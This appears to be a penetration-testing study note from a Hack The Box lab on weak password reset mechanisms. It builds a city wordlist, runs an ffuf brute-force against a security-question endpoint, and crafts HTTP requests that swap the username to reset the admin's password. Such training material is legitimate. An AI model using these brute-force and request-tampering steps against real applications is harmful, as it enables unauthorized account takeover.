---
title: b-Vulnerable Password Reset
draft: false
tags:
  - ffuf
---
## Guessable Password Reset Questions

Often, web applications authenticate users who have lost their passwords by requesting that they answer one or multiple security questions.

e.g

- "`What is your mother's maiden name?`"
- "`What city were you born in?`"

For instance, assuming a web application uses a security question like `What city were you born in?`, we can attempt to bruteforce the answer to this question.

[This](https://github.com/datasets/world-cities/blob/master/data/world-cities.csv) CSV file contains a list of more than 25,000 cities with more than 15,000 inhabitants from all over the world.

Since the CSV file contains the city name in the first field, we can create our wordlist containing only the city name on each line using the following command:

```shell-session
jadu101@htb[/htb]$ cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt

jadu101@htb[/htb]$ wc -l city_wordlist.txt 

26468 city_wordlist.txt
```

Now let's use `ffuf` to bruteforce security response:

```shell-session
jadu101@htb[/htb]$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."

<SNIP>

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
    * FUZZ: Houston
```

After obtaining the security response, we can reset the admin user's password and entirely take over the account.

For instance, if we knew that our target user was from Germany, we could create a wordlist containing only German cities, reducing the number to about a thousand cities:

```shell-session
jadu101@htb[/htb]$ cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt

jadu101@htb[/htb]$ wc -l german_cities.txt 

1117 german_cities.txt
```


## Manipulate the Reset Request

Let's say password reset request comes with a username as such:

```http
POST /security_question.php HTTP/1.1
Host: pwreset.htb
Content-Length: 43
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

security_response=London&username=htb-stdnt
```

We can manipulate the request and change the admin user's password instead:

```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 32
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=admin
```
